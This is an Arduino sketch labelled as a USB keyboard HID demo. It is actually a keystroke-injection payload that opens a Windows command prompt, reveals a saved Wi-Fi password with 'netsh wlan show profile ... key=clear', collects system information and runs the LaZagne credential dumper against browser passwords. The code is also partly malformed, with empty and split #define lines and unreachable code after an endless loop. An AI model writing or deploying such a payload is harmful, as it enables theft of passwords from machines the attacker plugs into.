

/* Arduino USB Keyboard HID demo */
#include <HIDKeyboard.h>
#include <Keyboard.h>
HIDKeyboard keyboard;

uint8_t buf[8] = { 0 }; /* Keyboard report buffer */

void setup();
void loop();

#define KEY_LEFT_GUI 0x08
#define KEY_R 21
#define KEY_A
#define KEY_D
#define KEY_V


#define KEY_ENTER 40
#define KEY_RIGHT_CTRL    0x84
/*
#d
efine KEY_LEFT_CTRL   0x80
#define KEY_LEFT_SHIFT    0x81
#define KEY_LEFT_ALT    0x82
#define KEY_LEFT_GUI    0x83
#define KEY_RIGHT_CTRL    0x84
#define KEY_RIGHT_SHIFT   0x85
#define KEY_RIGHT_ALT   0x86
#define KEY_RIGHT_GUI   0x87
*/
void setup()
{
Serial.begin(9600);
delay(200);

}

void loop()
{
buf[0] = KEY_LEFT_GUI;
buf[2] = KEY_R;

Serial.write(buf, 8); // Send GUI+R keypress
buf[0] = 0;
buf[2] = 0;
Serial.write(buf, 8); // Release key
delay(1000);
keyboard.println("cmd");
delay(1000);
keyboard.println(" netsh wlan  show profile");   
delay(1000);
keyboard.println(" netsh wlan  show profile MAYA key=clear");
delay (1000);  
keyboard.println(" Systeminfo");
delay (1000);  
keyboard.println(" cd Desktop"); 
delay (1000);
keyboard.println("  lazagne.exe -h"); 
delay (1000);
keyboard.println(" laZagne.exe browsers "); 
delay (1000);

keyboard.println("Systeminfo > seguin.txt"); 
delay (1000);

while(1);

keyboard.println(KEY_ENTER);


}
